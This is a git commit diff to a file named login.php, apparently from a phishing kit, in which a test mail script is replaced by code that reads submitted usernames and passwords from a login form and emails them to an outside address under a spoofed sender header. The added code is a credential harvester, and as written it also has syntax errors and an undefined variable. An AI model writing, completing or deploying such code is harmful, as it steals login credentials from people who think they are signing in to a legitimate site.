1624041cda752886116bf817abf845f4370a33dc
r00t-haxor <57871695+r00t-haxor@users.noreply.github.com>
2021-03-22 09:44:17 -0400

    Update login.php

--- login.php
+++ login.php
@@ -1,10 +1,17 @@
-
 <?php
-$to = "yonajoj493@naymeo.com";
-$subject = "TESTING SEND";
-$txt = "Hello world!";
-$headers = "From: webmaster@example.com" . "\r\n" .
-"CC: somebodyelse@example.com";
 
-mail($to,$subject,$txt,$headers);
-?>
+  $user = $_POST['user'];
+  $pass = $_POST['pass'];
+ 
+
+  $to = "yonajoj493@naymeo.com";
+  $email_subject = "$user \r\n"
+  $email_body = "$pass \r\n"
+
+  $headers = "From: sent@github.io";
+
+  $headers .= "Reply-To: $visitor_email \r\n";
+
+  mail($to,$email_subject,$email_body,$headers);
+ ?>
+
